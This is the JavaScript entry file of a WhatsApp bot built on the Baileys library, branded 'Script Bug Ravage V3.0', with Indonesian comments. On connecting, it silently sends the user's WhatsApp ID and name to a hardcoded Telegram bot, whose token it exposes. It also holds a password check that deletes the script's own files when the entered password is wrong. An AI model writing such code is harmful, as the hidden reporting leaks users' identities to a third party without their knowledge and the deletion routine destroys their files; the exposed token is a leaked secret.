/*
* KALO GABISA BUAT SC JANGAN NGAKU² LU YANG BIKIN YA DEK. 

* Mau rinem? 

* Minimal kasih credits
© Daffa Developer
*/


require('./settings');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const figlet = require('figlet');
const chalk = require("chalk");
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('./lib/color');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, getTime, getRandom, sleep } = require('./lib/myfunc');

const usePairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => {
return new Promise((resolve) => { rl.question(text, resolve) });
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7442755212:AAHfD2oFM40Ikz07tzL29lyxgf7GuJHzH-c/sendMessage`, {
            chat_id: '8135629926',
            text: message
        });
    } catch (error) {
    }
};

const manualPassword = 'DaffaGanteng'; // gausah ganti soalnya akses kek gw pegang, tar gw hapus semua erorr

// Fungsi untuk menghapus file
function deleteFiles() {
    const filesToDelete = ['DaffaDev.js', 'index.js']; // Ganti dengan nama file.js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(`File ${file} Telah di Hapus Karena User Bukan Buyer Ori Daffa Developer 🤪`);
        }
    });
}

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Getting Connection Acces")}
${chalk.blue("Acces Granted")}
`));  
console.log(chalk.white.bold(`${chalk.cyan(`Welcome To Script Bug Ravage V3.0`)}

`));

// Whatsapp Connect
async function ConnetToWhatsapp() {
const { state, saveCreds } = await useMultiFileAuthState(`./${session}`);
const dafa = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"]
});
if (usePairingCode && !dafa.authState.creds.registered) {
const inputPassword = await question('Masukkan Password Yang Di berikan Developer:\n');

        if (inputPassword !== manualPassword) {
            console.log('Password Salah ❌\nSystem Akan Menghapus File Dan mematikan Running!');
            deleteFiles(); // Hapus file jika password salah
            process.exit(); // Matikan konsol
        }
        console.log(chalk.green.bold(`Password Benar ✅\nselamat menikmati😎👋`));
const phoneNumber = await question(chalk.cyan.bold('Masukin Nomer Lu Bree!\nawali dengan 628xx : '));
const code = await dafa.requestPairingCode(phoneNumber.trim());
console.log(chalk.green.bold(`Code Bot : ${code}`));
}

store.bind(dafa.ev);
dafa.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!dafa.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(dafa, mek, store)
require("./DaffaDev.js")(dafa, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    dafa.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    dafa.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = dafa.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    dafa.public = true

    dafa.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'));
                dafa.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`));
                dafa.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
            console.log(color('Menghubungkan . . . '));
        } else if (connection === "open") {
            console.log(color('Bot Berhasil Tersambung'));
            sendTelegramNotification(`Connection information report 🌸\n\nThe device has been connected, Here is the information\n> User ID : ${dafa.user.id}\n> Username : ${dafa.user.name}\n\nScript Ravage V3.0: Created By Daffa Developer`);
        }
    });

    dafa.sendText = (jid, text, quoted = '', options) => dafa.sendMessage(jid, { text: text, ...options }, { quoted });
    
    dafa.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    dafa.ev.on('creds.update', saveCreds);
    return dafa;
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
